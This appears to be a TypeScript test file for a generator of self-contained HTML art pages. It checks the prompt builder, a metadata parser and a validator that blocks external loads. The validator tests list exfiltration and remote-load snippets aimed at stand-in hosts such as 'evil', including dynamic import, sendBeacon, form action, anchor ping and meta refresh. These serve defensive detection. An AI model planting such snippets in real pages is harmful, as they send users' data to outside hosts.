import { test } from "node:test";
import assert from "node:assert/strict";
import {
  buildGeneratorTask,
  validateSelfContained,
  parseMeta,
} from "./generator.ts";

test("task prompt embeds catalogue digest and the three filenames", () => {
  const task = buildGeneratorTask("- Some Catalogued Work (2020) — Source — Mechanism");
  assert.match(task, /Some Catalogued Work/);
  assert.match(task, /index\.html/);
  assert.match(task, /motivation\.md/);
  assert.match(task, /meta\.json/);
  assert.match(task, /self-contained/i);
});

test("validateSelfContained passes a clean inline page (license <a href> allowed)", () => {
  const html = `<!doctype html><html><head><style>body{background:#000;color:#fff}</style></head>
<body><h1>YES</h1>
<a href="https://creativecommons.org/licenses/by-sa/4.0/">CC BY-SA 4.0</a>
<script>document.title="ok"</script></body></html>`;
  assert.deepEqual(validateSelfContained(html), []);
});

test("validateSelfContained flags an external script src", () => {
  const v = validateSelfContained(`<script src="https://cdn.example.com/x.js"></script>`);
  assert.ok(v.some((s) => /external src/.test(s)), v.join(" | "));
});

test("validateSelfContained flags external stylesheet link", () => {
  const v = validateSelfContained(`<link rel="stylesheet" href="https://x.com/a.css">`);
  assert.ok(v.some((s) => /external <link href>/.test(s)), v.join(" | "));
});

test("validateSelfContained flags web fonts (@import / url) and fetch", () => {
  const html = `<style>@import url('https://fonts.googleapis.com/css?f=x');</style><script>fetch('/data')</script>`;
  const v = validateSelfContained(html);
  assert.ok(v.some((s) => /@import|url\(\) external/.test(s)), v.join(" | "));
  assert.ok(v.some((s) => /fetch/.test(s)), v.join(" | "));
});

test("validateSelfContained flags protocol-relative src", () => {
  const v = validateSelfContained(`<img src="//evil.cdn/x.png">`);
  assert.ok(v.some((s) => /external src/.test(s)), v.join(" | "));
});

test("validateSelfContained flags the additional exfil/load vectors", () => {
  const cases: [string, RegExp][] = [
    [`<img srcset="https://cdn/x.png 1x">`, /srcset/],
    [`<script>import("https://evil/x.js")</script>`, /dynamic import/],
    [`<script>navigator.sendBeacon("/log", d)</script>`, /sendBeacon/],
    [`<form action="https://evil/collect"></form>`, /form action/],
    [`<a ping="https://evil/track">x</a>`, /anchor ping/],
    [`<meta http-equiv="refresh" content="0;url=https://evil">`, /meta refresh/],
    [`<base href="https://evil/">`, /base href/],
    [`<object data="https://evil/x.swf"></object>`, /object\/embed data/],
    [`<script type="importmap">{"imports":{}}</script>`, /import map/],
  ];
  for (const [html, expected] of cases) {
    const v = validateSelfContained(html);
    assert.ok(v.some((s) => expected.test(s)), `expected ${expected} for ${html}; got ${v.join(" | ")}`);
  }
});

test("parseMeta accepts a complete meta object", () => {
  const meta = parseMeta(
    JSON.stringify({
      title: "Test Work",
      summary: "a one-liner",
      mechanism: "render loop",
      principles: ["P1", "P5"],
      references: ["Duchamp"],
      license: "CC BY-SA 4.0",
    }),
  );
  assert.equal(meta.title, "Test Work");
  assert.deepEqual(meta.principles, ["P1", "P5"]);
});

test("parseMeta throws on missing required fields", () => {
  assert.throws(() => parseMeta(JSON.stringify({ title: "Only a title" })));
});

test("parseMeta throws on invalid JSON", () => {
  assert.throws(() => parseMeta("{not json"));
});
